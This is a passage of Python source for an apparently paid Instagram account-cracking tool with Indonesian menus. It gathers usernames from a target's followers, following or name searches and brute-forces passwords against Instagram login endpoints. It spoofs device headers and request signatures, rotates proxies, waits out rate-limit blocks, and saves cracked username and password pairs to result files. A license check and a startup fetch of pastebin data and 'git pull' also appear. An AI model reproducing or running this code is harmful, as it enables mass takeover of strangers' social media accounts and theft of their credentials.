				head = {'X-IG-Connection-Speed': f'{rr(111,3700)}kbps', 'Accept': '*/*', 'X-IG-Connection-Type': rc(['MOBILE(LTE)', 'WIFI']), 'X-IG-App-ID': '124024574287414', 'Accept-Encoding': 'br, gzip, deflate', 'Accept-Language': 'id-ID', 'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8', 'X-IG-ABR-Connection-Speed-KBPS': '0', 'Content-Length': f'{len(str(date))}', 'User-Agent': self.ua_ran(), 'Connection': 'keep-alive', 'X-IG-Capabilities': '36r/dw=='}
				data = {"jazoest": str(rr(11111,55555)),"phone_id": str(uuid.uuid4()),"_csrftoken": ses.cookies["csrftoken"],"enc_password": self.enc_pw(pw, link.text),"username": user,"adid": str(uuid.uuid4()),"guid": str(uuid.uuid4()),"device_id": "android-%s"%(hashlib.sha256(str(time.time()).encode()).hexdigest()[:16]),"google_tokens":"[]","login_attempt_count": logtemp}
				respon=ses.post("https://i.instagram.com/api/v1/accounts/login/", data=date, headers=head)
				haris=json.loads(respon.text)
				if "userId" in str(haris) or "sessionid" in ses.cookies.get_dict():
					success.append(user)
					nama,pengikut,mengikut,postingan=self.APIinfo(user)
					print("")
					prints(Panel(f'\r{P2}[{H2}✓{P2}] Nama      : {H2}{nama}                \n{P2}[{H2}✓{P2}] Username  : {H2}{user}                \n{P2}[{H2}✓{P2}] Password  : {H2}{pw}                \n{P2}[{H2}✓{P2}] Pengikut  : {H2}{pengikut}                \n{P2}[{H2}✓{P2}] Mengikuti : {H2}{mengikut}                \n{P2}[{H2}✓{P2}] Postingan : {H2}{postingan}',title=f"{H2}LIVE",width=80,padding=(0,4),style=""))
					print("")
					open('.logCrack','a').write(f'{H}╭({H}{loop}{H}) {H}{user} {H}|| {H}{pw}\n{H}╰{H}{respon.text}\n')
					open(f"result/success/success-{day}.txt","a").write(f'{user}|{pw}|{pengikut}|{mengikut}\n')
					break
				elif "checkpoint_url" in str(haris):
					checkpoint.append(user)
					nama,pengikut,mengikut,postingan=self.APIinfo(user)
					print("")
					prints(Panel(f'\r{P2}[{K2}X{P2}] Nama      : {K2}{nama}                \n{P2}[{K2}X{P2}] Username  :{K2} {user}                \n{P2}[{K2}X{P2}] Password  :{K2} {pw}                \n{P2}[{K2}X{P2}] Pengikut  : {K2}{pengikut}                \n{P2}[{K2}X{P2}] Mengikuti : {K2}{mengikut}                \n{P2}[{K2}X{P2}] Postingan : {K2}{postingan}',title=f"{K2}CHECKPOINT",width=80,padding=(0,4),style=""))
					print("")
					open('.logCrack','a').write(f'{K}╭({K}{loop}{K}) {K}{user} {K}|| {K}{pw}\n{K}╰{K}{respon.text}\n')
					open(f"result/checkpoint/checkpoint-{day}.txt","a").write(f'{user}|{pw}|{pengikut}|{mengikut}\n')
					break
				elif 'ip_block' in str(respon.text):
					prog.update(des,description=f"{M2}[SPAM][/] {str(loop)}/{len(internal)} OK : -[bold green]{len(success)}[/] CP : -[bold yellow]{len(checkpoint)}[/]")
					prog.advance(des)
					time.sleep(10)
				else:
					open('.logCrack','a').write(f'{N}╭({N}{loop}{N}) {N}{user} {N}|| {N}{pw}\n{N}╰{N}{respon.text}\n')
					continue
			loop+=1
		except requests.ConnectionError:
			time.sleep(10)
		#except Exception as e:prints(e)
	def V5(self,user,pas):
		global loop,success,checkpoint
		ses=requests.Session()
		rr=random.randint;rc=random.choice
		logtemp=0
		if logtemp > 10:logtemp=0
		prog.update(des,description=f"[{acakrich}{user}[/]] {str(loop)}/{len(internal)} OK : -[bold green]{len(success)}[/] CP : -[bold yellow]{len(checkpoint)}[/]")
		prog.advance(des)
		for pw in pas:
			try:
				link = ses.get("https://www.instagram.com/fxcal/auth/login/?app_id=1217981644879628&etoken=AbikEBmNhMsxlnCabkCq5bjspvbWU6_UCk0FCzhKplDHJnyXJFzjeLj1NoF95wRUvkfZ4TL3w5nB3KonV8Gu7eeenGJLOpZ0DT9lZfD2336OptE_6iHBRa_R&next=https%3A%2F%2Faccountscenter.instagram.com%2Fadd%2F%3Fauth_flow%3Dig_linking%26background_page%3D%252Faccounts%252F")
				data = {"jazoest": str(rr(11111,55555)),"phone_id": str(uuid.uuid4()),"_csrftoken": ses.cookies["csrftoken"],"enc_password": self.enc_pw(pw, link.text),"username": user,"adid": str(uuid.uuid4()),"guid": str(uuid.uuid4()),"device_id": "android-%s"%(hashlib.sha256(str(time.time()).encode()).hexdigest()[:16]),"google_tokens":"[]","login_attempt_count": logtemp}
				kode = hmac.new("a86109795736d73c9a94172cd9b736917d7d94ca61c9101164894b3f0d43bef4".encode('utf-8'), str(json.dumps(data)).encode('utf=8'),hashlib.sha256).hexdigest()
				date = f'signed_body={kode}.%7B%22jazoest%22%3A%22{data["jazoest"]}%22%2C%22phone_id%22%3A%22{str(uuid.uuid4())}%22%2C%22_csrftoken%22%3A%22{ses.cookies["csrftoken"]}%22%2C%22enc_password%22%3A%22%23PWD_INSTAGRAM{urllib.parse.quote(data["enc_password"].encode("utf8")).split("SER")[1]}%22%2C%22username%22%3A%22{user}%22%2C%22adid%22%3A%22{str(uuid.uuid4())}%22%2C%22guid%22%3A%22{str(uuid.uuid4())}%22%2C%22device_id%22%3A%22{"android-%s"%(hashlib.sha256(str(time.time()).encode()).hexdigest()[:16])}%22%2C%22google_tokens%22%3A%22%5B%5D%22%2C%22login_attempt_count%22%3A%22{logtemp}%22%7D'
				head = {'X-IG-Connection-Speed': f'{rr(111,3700)}kbps', 'Accept': '*/*', 'X-IG-Connection-Type': rc(['MOBILE(LTE)', 'WIFI']), 'X-IG-App-ID': '124024574287414', 'Accept-Encoding': 'br, gzip, deflate', 'Accept-Language': 'id-ID', 'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8', 'X-IG-ABR-Connection-Speed-KBPS': '0', 'Content-Length': f'{len(str(date))}', 'User-Agent': self.ua_baru(), 'Connection': 'keep-alive', 'X-IG-Capabilities': '36r/dw=='}
				xnxx = ses.post("https://i.instagram.com/api/v1/accounts/login/", data=date, headers=head)
				logtemp +=1
				ncek=json.loads(xnxx.text)
				if "logged_in_user" in str(ncek):
					success.append(user)
					nama,pengikut,mengikut,postingan=self.APIinfo(user)
					print("")
					prints(Panel(f'\r{P2}[{H2}✓{P2}] Nama      : {H2}{nama}                \n{P2}[{H2}✓{P2}] Username  : {H2}{user}                \n{P2}[{H2}✓{P2}] Password  : {H2}{pw}                \n{P2}[{H2}✓{P2}] Pengikut  : {H2}{pengikut}                \n{P2}[{H2}✓{P2}] Mengikuti : {H2}{mengikut}                \n{P2}[{H2}✓{P2}] Postingan : {H2}{postingan}',title=f"{H2}LIVE",width=80,padding=(0,4),style=""))
					print("")
					open(f"result/success/success-{day}.txt","a").write(f'{user}|{pw}|{pengikut}|{mengikut}\n')
					open('.logCrack','a').write(f'{H}╭({H}{loop}{H}) {H}{user} {H}|| {H}{pw}\n{H}╰{H}{xnxx.text}\n')
					break
				elif 'https://i.instagram.com/challenge' in str(xnxx.text):
					nama,pengikut,mengikut,postingan=self.APIinfo(user)
					print("")
					prints(Panel(f'\r{P2}[{K2}X{P2}] Nama      : {K2}{nama}                \n{P2}[{K2}X{P2}] Username  :{K2} {user}                \n{P2}[{K2}X{P2}] Password  :{K2} {pw}                \n{P2}[{K2}X{P2}] Pengikut  : {K2}{pengikut}                \n{P2}[{K2}X{P2}] Mengikuti : {K2}{mengikut}                \n{P2}[{K2}X{P2}] Postingan : {K2}{postingan}',title=f"{K2}CHECKPOINT",width=80,padding=(0,4),style=""))
					print("")
					open(f"result/checkpoint/checkpoint-{day}.txt","a").write(f'{user}|{pw}|{pengikut}|{mengikut}\n')
					checkpoint.append(user)
					open('.logCrack','a').write(f'{K}╭({K}{loop}{K}) {K}{user} {K}|| {K}{pw}\n{K}╰{K}{xnxx.text}\n')
					break
				elif 'ip_block' in str(xnxx.text) or 'spam' in str(xnxx.text):
					prog.update(des,description=f"{M2}[SPAM][/] {str(loop)}/{len(internal)} OK : -[bold green]{len(success)}[/] CP : -[bold yellow]{len(checkpoint)}[/]")
					prog.advance(des)
					time.sleep(10);self.crackAPI2(user,pas)
					open('.logCrack','a').write(f'{M}╭({loop}) {user} || {pw}\n╰{xnxx.text}\n{N}\n')
					loop-=1
					break
				else:open('.logCrack','a').write(f'{N}╭({loop}) {user} || {pw}\n╰{xnxx.text}\n{N}\n')
			except requests.exceptions.ConnectionError:
				prog.update(des,description=f"{M2}[SPAM][/] {str(loop)}/{len(internal)} OK : -[bold green]{len(success)}[/] CP : -[bold yellow]{len(checkpoint)}[/]")
				prog.advance(des)
				time.sleep(5)
				self.crackAPI2(user,pas)
				loop-=1
				break
		loop+=1
	def V6(self,user,pas):
		global loop,success,checkpoint
		ses=requests.Session()
		prog.update(des,description=f"[{acakrich}crack[/]] {str(loop)}/{len(internal)} OK : -[bold green]{len(success)}[/] CP : -[bold yellow]{len(checkpoint)}[/]")
		prog.advance(des)
		ua=self.ua_baru()
		for pw in pas:
			try:
				ses.get('https://www.instagram.com/web/__mid')
				
				head={'Host': 'www.instagram.com','Accept':'*/*','Accept-Encoding':'gzip, deflate, br','Accept-Language':'en-US,en;q=0.9','Content-Length':'353','Content-Type':'application/x-www-form-urlencoded','Origin':'https://www.instagram.com','Referer':'https://www.instagram.com/accounts/login/?force_classic_login=&','Sec-Ch-Ua':'"Not.A/Brand";v="8", "Chromium";v="114", "Google Chrome";v="114"','Sec-Ch-Ua-Full-Version-List':'"Not.A/Brand";v="8.0.0.0", "Chromium";v="114.0.5735.134", "Google Chrome";v="114.0.5735.134"','Sec-Ch-Ua-Mobile':'?0','Sec-Fetch-Dest':'empty','Sec-Fetch-Mode':'cors','Sec-Fetch-Site':'same-origin','User-Agent': ua,'X-Asbd-Id':'129477','X-Csrftoken': ses.cookies['csrftoken'],'X-Ig-App-Id':'936619743392459','X-Ig-Www-Claim':'hmac.AR05k4r4Hi4qW2gWrhumyq_wGultMubwNGuatj_4cas9Lr1e','X-Instagram-Ajax':'1007725354','X-Requested-With':'XMLHttpRequest'}
				
				data = {'enc_password': self.encpwd(pw),'optIntoOneTap': 'false','queryParams': {},'trustedDeviceRecords': {},'username':user}
				respon=ses.post('https://www.instagram.com/api/v1/web/accounts/login/ajax/',headers=head,data=data)
				haris=json.loads(respon.text)
				if "userId" in str(haris) or "sessionid" in ses.cookies.get_dict():
					success.append(user)
					nama,pengikut,mengikut,postingan=self.APIinfo(user)
					print("")
					prints(Panel(f'\r{P2}[{H2}✓{P2}] Nama      : {H2}{nama}                \n{P2}[{H2}✓{P2}] Username  : {H2}{user}                \n{P2}[{H2}✓{P2}] Password  : {H2}{pw}                \n{P2}[{H2}✓{P2}] Pengikut  : {H2}{pengikut}                \n{P2}[{H2}✓{P2}] Mengikuti : {H2}{mengikut}                \n{P2}[{H2}✓{P2}] Postingan : {H2}{postingan}',title=f"{H2}LIVE",width=80,padding=(0,4),style=""))
					print("")
					open('.logCrack','a').write(f'{H}╭({H}{loop}{H}) {H}{user} {H}|| {H}{pw}\n{H}╰{H}{respon.text}\n')
					open(f"result/success/success-{day}.txt","a").write(f'{user}|{pw}|{pengikut}|{mengikut}\n')
					break
				elif "/challenge/action" in str(haris):
					checkpoint.append(user)
					nama,pengikut,mengikut,postingan=self.APIinfo(user)
					print("")
					prints(Panel(f'\r{P2}[{K2}X{P2}] Nama      : {K2}{nama}                \n{P2}[{K2}X{P2}] Username  :{K2} {user}                \n{P2}[{K2}X{P2}] Password  :{K2} {pw}                \n{P2}[{K2}X{P2}] Pengikut  : {K2}{pengikut}                \n{P2}[{K2}X{P2}] Mengikuti : {K2}{mengikut}                \n{P2}[{K2}X{P2}] Postingan : {K2}{postingan}',title=f"{K2}CHECKPOINT",width=80,padding=(0,4),style=""))
					print("")
					open('.logCrack','a').write(f'{K}╭({K}{loop}{K}) {K}{user} {K}|| {K}{pw}\n{K}╰{K}{respon.text}\n')
					open(f"result/checkpoint/checkpoint-{day}.txt","a").write(f'{user}|{pw}|{pengikut}|{mengikut}\n')
					break
				elif 'ip_block' in str(respon.text):
					prog.update(des,description=f"{M2}[SPAM][/] {str(loop)}/{len(internal)} OK : -[bold green]{len(success)}[/] CP : -[bold yellow]{len(checkpoint)}[/]")
					prog.advance(des)
					time.sleep(10)
				else:
					open('.logCrack','a').write(f'{N}╭({N}{loop}{N}) {N}{user} {N}|| {N}{pw}\n{N}╰{N}{respon.text}\n')
			except requests.exceptions.ConnectionError:
				prog.update(des,description=f"{M2}[SPAM][/] {str(loop)}/{len(internal)} OK : -[bold green]{len(success)}[/] CP : -[bold yellow]{len(checkpoint)}[/]")
				prog.advance(des)
				time.sleep(5)
			#except Exception as e:prints(e)
		loop+=1
	def checkAPI(self,user,pw):
		ses=requests.Session()
		ncek=random.randint(1000000000, 99999999999)
		ts = calendar.timegm(current_GMT)
		nip=random.choice(prox)
		proxs= {'http': 'socks4://'+nip}
		ua = self.ua_sendiri()
		try:
			p=ses.get('https://www.instagram.com/web/__mid')
			ses.headers.update({
                    'Host':'www.instagram.com',
                    'x-ig-www-claim':'0',
                    'x-instagram-ajax':'6543adcc6d29',
                    'content-type':'application/x-www-form-urlencoded',
                    'accept':'*/*',
                    'x-requested-with':'XMLHttpRequest',
                    'x-asbd-id':'198387',
                     'user-agent':ua,
                     'x-csrftoken':p.cookies['csrftoken'],
                     'x-ig-app-id':'1217981644879628',
                     'origin':'https://www.instagram.com',
                     'sec-fetch-site':'same-origin',
                     'sec-fetch-mode':'cors',
                     'sec-fetch-dest':'empty',
                     'referer':'https://www.instagram.com/accounts/login/',
                     'accept-encoding':'gzip, deflate',
                     'accept-language':'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
			data = {
           "enc_password": f"#PWD_INSTAGRAM_BROWSER:0:{ts}:{pw}",
			"username": user,
			"queryParams": "{}",
			"optIntoOneTap": False,
			"stopDeletionNonce": "",
			"trustedDeviceRecords": "{}"}
			respon=ses.post("https://www.instagram.com/accounts/login/ajax/", data=data, proxies = proxs, allow_redirects=True)
			ncek=json.loads(respon.text)
			if 'userId' in str(ncek):
				nama,pengikut,mengikut,postingan=self.APIinfo(user)
				prints(Panel(f'\r{P2}[{H2}✓{P2}] Nama      : {H2}{nama}                \n{P2}[{H2}✓{P2}] Username  : {H2}{user}                \n{P2}[{H2}✓{P2}] Password  : {H2}{pw}                \n{P2}[{H2}✓{P2}] Pengikut  : {H2}{pengikut}                \n{P2}[{H2}✓{P2}] Mengikuti : {H2}{mengikut}                \n{P2}[{H2}✓{P2}] Postingan : {H2}{postingan}',title=f"{H2}LIVE",width=80,padding=(0,4),style=""))
	#			open(f"stokakunig.txt","a").write(f'USERNAME : {user}\nPASSWORD : {pw}\nPENGIKUT : {pengikut}\nPOSTINGAN : {postingan}\n')
			elif 'checkpoint_url' in str(ncek):
				nama,pengikut,mengikut,postingan=self.APIinfo(user)
				prints(Panel(f'\r{P2}[{K2}X{P2}] Nama      : {K2}{nama}                \n{P2}[{K2}X{P2}] Username  :{K2} {user}                \n{P2}[{K2}X{P2}] Password  :{K2} {pw}                \n{P2}[{K2}X{P2}] Pengikut  : {K2}{pengikut}                \n{P2}[{K2}X{P2}] Mengikuti : {K2}{mengikut}                \n{P2}[{K2}X{P2}] Postingan : {K2}{postingan}',title=f"{K2}CHECKPOINT",width=80,padding=(0,4),style=""))
			#	open(f"result/checkpoint/-{day}.txt","a").write(f'{user}|{pw}|{pengikut}|{mengikut}\n')
			elif 'Please wait a few minutes' in str(respon.text):
				sys.stdout.write(f"\r{M} ! terkena spam, aktifkan mode pesawat ");sys.stdout.flush();sleep(10)
			else:
				nama,pengikut,mengikut,postingan=self.APIinfo(user)
				prints(Panel(f'\r{P2}[{K2}X{P2}] Nama      : {K2}{nama}                \n{P2}[{K2}X{P2}] Username  :{K2} {user}                \n{P2}[{K2}X{P2}] Password  :{K2} {pw}                \n{P2}[{K2}X{P2}] Pengikut  : {K2}{pengikut}                \n{P2}[{K2}X{P2}] Mengikuti : {K2}{mengikut}                \n{P2}[{K2}X{P2}] Postingan : {K2}{postingan}',title=f"{K2}Akun telah diganti password",width=80,padding=(0,4),style=""))
		except requests.ConnectionError:
			sys.stdout.write(f"\r{M} ! terkena spam, aktifkan mode pesawat ");sys.stdout.flush();sleep(10)
		except Exception as e:prints(e)
			#self.checkAPI(user,pw) 	 
	def cek_hasil(self):
		no,nom = 0,[]
		urut = []
		prints(Panel(f"\t    {M2}!!!{hapus} Cek Hasil Akun Crack", padding=(0,4),style=f"{color_table}"))
		urut.append(Panel(f"{P2}[{H2}1{P2}] Cek hasil akun {H2}success{hapus}",padding=(0,5),style=f"{color_table}"))
		urut.append(Panel(f"{P2}[{H2}2{P2}] Cek hasil akun {K2}checkpoint{hapus}",padding=(0,5),style=f"{color_table}"))
		self.tol.print(Columns(urut))
		one=input("Pilihanmu : ")
		if one in ['1','01']:
			try:ok = os.listdir('result/success/')
			except:prints(f" [{M2}!{hapus}] tidak ada hasil success");time.sleep(1);self.menu()
			for x in ok:
				nom.append(x)
				no+=1
				try:jum= open('result/success/'+x,'r').readlines()
				except:continue
				print(f' [{H}{no}{N}] {x} - {H}{len(jum)} {N}akun')
			abc = input(f' [{H}?{N}] nomor file : ')
			file = nom[int(abc)-1]
			try:buka = open('result/success/'+file,'r').read()
			except:prints(f" [{M2}!{hapus}] tidak hasil success");time.sleep(1);self.menu()
			print("")
			print( H+buka+N)
			input(f'\n[{H}!{N}] tekan enter untuk kembali');self.menu()
		elif one in ['2','02']:
			try:ok = os.listdir('result/checkpoint/')
			except:prints(f" [{M2}!{hapus}] tidak hasil success");self.menu()
			for x in ok:
				nom.append(x)
				no+=1
				try:jum= open('result/checkpoint/'+x,'r').readlines()
				except:continue
				print(f' [{K}{no}{N}] {x} - {K}{len(jum)} {N}akun')		
			abc = input(f' [{H}?{N}] nomor file : ')
			file = nom[int(abc)-1]
			try:buka = open('result/checkpoint/'+file,'r').read()
			except:prints(f" [{M2}!{hapus}] tidak hasil checkpoint");time.sleep(1);self.menu()
			print("")
			print( K+buka+N)
			input(f'\n[{H}!{N}] tekan enter untuk kembali');self.menu()
		else:print(f" [{M}!{N}] isi yang benar");time.sleep(2);self.menu()
	def menu(self):
		self.logo()
		prints(Panel(f"""\t {P2}Ketik {M2}Bug {P2}Untuk Melaporkan Bug Script""",width=80,padding=(0,7),style=f"{color_table}"))
		c=input(f'•{N} Pilih :{C}  ')
		if c=='':
			self.menu()
		elif c in ('1','01'):
			prints(Panel(f"{P2}Crack Dari Pencarian Nama",width=80,padding=(0,2),style=f"{color_table}"))
			nama=input(f'{N} • Masukan nama :{N} ')
			pr=f"Tekan {M2}CTRL + C{hapus} Untuk Berhenti Dump Username"
			so=nel(pr,style="")
			sol().print(so)
			name=self.searchAPI(self.cookie,nama)
			self.passwordAPI(name)
		elif c in ('2','02'):
			prints(Panel(f"{P2}Crack Dari Pengikut",width=80,padding=(0,2),style=f"{color_table}"))
			#massal(self)
			mas=input('• Apakah anda ingin crack masal? y/t >  ')
			if mas in ['y','Y']:
				masal(self)
			elif mas in ['t','T']:
				massal(self)
			elif mas in ['']:
				print('ISI JANGAN KOSONG KENTOD!')
		elif c in ('3','03'):
			prints(Panel(f"{P2}Crack Dari Mengikut",width=80,padding=(0,2),style=f"{color_table}"))
			mas=input('• Apakah anda ingin crack masal? y/t >  ')
			if mas in ['y','Y']:
				mengi(self)
			elif mas in ['t','T']:
				meng(self)
			elif mas in ['']:
				print('ISI JANGAN KOSONG KENTOD!')
		elif c in ('4','04'):
			print('')
			for i in os.listdir('result/checkpoint/'):
				print(f' [{U}!{C}] {i}')
			c=input(f'\n [{CY}?{N}] Masukan nama file: {C}')
			g=open("result/checkpoint/%s"%(c)).read().splitlines()
			print(f'\n{CY} [+] Total Result {H}{len(g)}{C}')
			print(f'\n{CY}┣[!] Proses mengecek status akun. silahkan tunggu sebentar{C}\n')
			for s in g:
				user=s.split('|')[0]
				pwd=s.split('|')[1]
				self.checkAPI(user,pwd)
			wel='# CRACK ULANG SELESAI'
			cik2=mark(wel ,style='green')
			sol().print(cik2)
			exit()
		elif c in ('5','05'):
			self.cek_hasil()
		elif c in ('6','06'):
			global following
			six=0
			print(f'\n [{U}!{C}] Bot Unfollow-All Dijalankan\n')
			nama="unfollow"
			x=open('.kukis.log','r').read()
			x_id=re.findall('sessionid=(\d+)',x)[0]
			back=self.infoAPI(self.cookie,'https://i.instagram.com/api/v1/friendships/%s/following/?count=100',x_id,nama)
			for i in following:
				six+=1
				sleep(float( random.uniform(nyMnD*10,nyMxD*10) / 10 ))
				six_id=self.sixAPI(i)
				print(f' {str(six)}{U} {C} {i} {H}Unfollow-Berhasil{C}')
				self.unfollowAPI(six_id,'5452333948',self.cookie)
				#print(w)
			input(f'\n\n [{U}#{C}] Unfollow-all selesai...');self.menu()
		elif c in ('lain','Lain'):
			ganti_tema()
		elif c in ('bug','Bug','BUG'):
			self.BUG()
		elif c in ('c','C'):
			self.ChangeLog()
		elif c in ('e','E'):
			self.Exit()
		else:
			self.menu()
def tlisensi():
    lu()
    cetak(nel('[!] Lisensi Tidak Valid\n[!] Silahkan Ketik [green]"Buy"[/green] Untuk membeli lisensi'))
    time.sleep(2)
    lisen=input('[•] Masukan Lisensi : ')
    if lisen in ['']:
     print(f'{M}[!] JANGAN KOSONG{N}');sleep(1)
     tlisensi()
    if lisen in ['buy','Buy']:
     os.system('xdg-open https://wa.me/6283114591358?text=Bang+beli+lisensi+IG+nya+dong');exit()
    loadinglisen()
    open('.lisen.txt','w').write(lisen)
    lisensi()   
def lisensi():
 try:
  cek=open('.lisen.txt').read()
  lisensikuni.append(cek)
 except:
  tlisensi()
 ses=requests.Session()
 res=ses.get('https://app.cryptolens.io/api/key/Activate?token=WyIyODk1MzkwMyIsImVUdmdBNEZpL0RyVEFReFFwVTBhMzhaelBIaHZJbHhWQkZSSUdHRVoiXQ==&ProductId=17514&Key='+lisensikuni[0]).json()
 status=res['licenseKey']['key']
 if status ==cek:
  li()
  cetak(nel('\t[green] SELAMAT LISENSI ANDA VALID[/green]'))
  time.sleep(2)
  lisensiku.append("sukses")
  login_kamu()
 elif status ==KeyError:
  os.system('rm .lisen.txt')
 else:
  tlisensi()
def mengi(self):
			try:
				menudump.append('mengikuti')
				prints(Panel(f"{P2}Pastikan Target Bersifat Publik {M2}!!!!",width=80,padding=(0,2),style=f"{color_table}"))
				m=int(input(f'{N}•{N} Masukan jumlah target: {N}'))
			except:m=1
			for t in range(m):
				t +=1
				print('\r')
				prints(Panel(f"{P2}Total Username Terkumpul : {H2}{len(internal)}",width=80,padding=(0,20),style=f"{color_table}"))
				nama=input(f' [{t}] Masukan Username : ')
				prints(Panel(f"[white]Tekan [red]CTRL + C[white] Untuk Berhenti",width=80,padding=(0,4),style=f"{color_table}"))
				id=self.idAPI(self.cookie,nama)
				info=self.ifoAPI(self.cookie,'https://i.instagram.com/api/v1/friendships/%s/following/?count=100',id,nama)
			self.passwordAPI(info)
def meng(self):
			menudump.append('mengikuti')
			prints(Panel(f"{P2}Pastikan Target Bersifat Publik {M2}!!!!",width=80,padding=(0,2),style=f"{color_table}"))
			nama=input(f'{N}• Username target : {C}')
			prints(Panel(f"[white]Tekan [red]CTRL + C[white] Untuk Berhenti",width=80,padding=(0,4),style=f"{color_table}"))
			id=self.idAPI(self.cookie,nama)
			info=self.ifoAPI(self.cookie,'https://i.instagram.com/api/v1/friendships/%s/following/?count=200',id,nama)
			self.passwordAPI(info)
def masal(self):
			try:
				menudump.append('pengikut')
				prints(Panel(f"{P2}Pastikan Target Bersifat Publik {M2}!!!!",width=80,padding=(0,2),style=f"{color_table}"))
				m=int(input(f'{H}•{H} Masukan jumlah target: {N}'))
			except:m=1
			for t in range(m):
				t +=1
				print(f"[white]Total Username Terkumpul : [green]{len(internal)}")
				nama=input(f'{N}• Masukan Username : ')
				prints(Panel(f"[white]Tekan [red]CTRL + C[white] Untuk Berhenti",width=80,padding=(0,4),style=f"{color_table}"))
				id=self.idAPI(self.cookie,nama)
				info=self.infoAPI(self.cookie,'https://i.instagram.com/api/v1/friendships/%s/followers/?count=200',id,nama)
			self.passwordAPI(info)
def massal(self):
			menudump.append('pengikut')
			prints(Panel(f"{P2}Pastikan Target Bersifat Publik {M2}!!!!",width=80,padding=(0,2),style=f"{color_table}"))
			m=input(f'{N}• Username target : {C}')
			prints(Panel(f"[white]Tekan [red]CTRL + C[white] Untuk Berhenti",width=80,padding=(0,4),style=f"{color_table}"))
			id=self.idAPI(self.cookie,m)
			info=self.infoAPI(self.cookie,'https://i.instagram.com/api/v1/friendships/%s/followers/?count=200',id,m)
			self.passwordAPI(info)
def ganti_tema():
         prints(Panel(f"""{P2}[{color_rich}01{P2}]. Ganti Warna Tema Merah  [{color_rich}06{P2}]. Ganti Warna Tema Pink
[{color_rich}02{P2}]. Ganti Warna Tema Hijau  [{color_rich}07{P2}]. Ganti Warna Tema Cyan
[{color_rich}03{P2}]. Ganti Warna Tema Kuning [{color_rich}08{P2}]. Ganti Warna Tema Putih
[{color_rich}04{P2}]. Ganti Warna Tema Biru   [{color_rich}09{P2}]. Ganti Warna Tema Orange
[{color_rich}05{P2}]. Ganti Warna Tema Ungu   [{color_rich}10{P2}]. Ganti Warna Tema Abu-Abu""",width=80,padding=(0,7),style=f"{color_table}"))
         ask = input(f"• Pilih Tema : ")
         if ask in["01","1"]:warna = "[#FF0000]";teks="merah"
         elif ask in["02","2"]:warna = "[#00FF00]";teks="hijau"
         elif ask in["03","3"]:warna = "[#FFFF00]";teks="kuning"
         elif ask in["04","4"]:warna = "[#00C8FF]";teks="biru"
         elif ask in["05","5"]:warna = "[#AF00FF]";teks="ungu"
         elif ask in["06","6"]:warna = "[#FF00FF]";teks="pink"
         elif ask in["07","7"]:warna = "[#00FFFF]";teks="cyan"
         elif ask in["08","8"]:warna = "[#FFFFFF]";teks="putih"
         elif ask in["09","9"]:warna = "[#FF8F00]";teks="orange"
         elif ask in["10"]:warna = "[#AAAAAA]";teks="abu-abu"
         open("assets/theme_color","w").write(warna+"|"+warna.replace("[","").replace("]",""))
         prints(Panel(f"""{P2}Berhasil Mengganti Tema Ke {teks}, Silahkan Jalankan Ulang Tools Nya""",width=80,padding=(0,6),style=f"{color_table}"))
         sys.exit()
def register_device():
	while True:
		clear()
		banner()
		if os.path.exists("/data/data/com.termux/files/usr/etc/.license"):
			key = open("/data/data/com.termux/files/usr/etc/.license","r").read()
			check = requests.get("https://pastebin.com/raw/83EMYMa2").text
			if key in check:
				clear()
				banner()
				lisensiku.append("sukses")
				cetak(nel(f" {H2} Key anda telah di konfirmasi ✓{hapus}"))
				time.sleep(1.5)
				login_kamu()
			else:
				pr=(f'# YOUR KEY : {key}')
				po=mark(pr,style='red')
				cetak(nel(po, style= ''))
				cetak(nel(f"[•] {M2}Key anda belum di konfirmasi{hapus}\n[•] {M2}Silahkan Beli Ke Wa {hapus}{H2}+6283114591358{hapus}{M2} untuk menggunakan sc{hapus}"))
				buy_key=input('  Tekan enter untuk chat whatsapp author untuk membeli key')
				if buy_key in [""]:pass
				jalan(f'  Anda akan diarahkan ke whatsapp author');time.sleep(2)
				os.system(f'xdg-open http://wa.me/+6283114591358?text=Bang+beli+key+sc+instagram+{key}')

		if not os.path.exists("/data/data/com.termux/files/usr/etc/.license"):
			key_gen = random.randint(10000000,99999999)
			enc_key = base64.b16encode(str(key_gen).encode()).decode("utf-8")
			with open("/data/data/com.termux/files/usr/etc/.license","w") as tulis:
				tulis.write(enc_key)
			
			continue
		
		break

if __name__=='__main__':
	ses=requests.Session()
	try:os.mkdir('result')
	except:pass
	try:os.system('touch .prox.txt')
	except:pass
	try:os.system('mkdir result/success')
	except:pass
	try:os.system('mkdir result/checkpoint')
	except:pass
	try:
		with requests.Session() as ses:
	         ko = ses.get('https://pastebin.com/raw/fnqH31za').json()
	         HARIS.update(ko)
	         ki = ses.get('https://pastebin.com/raw/KnuN98sB').json()
	         HARIS1.update(ki)
	         os.system("git pull")
	         login_kamu()
	except Exception as e:
		prints(e)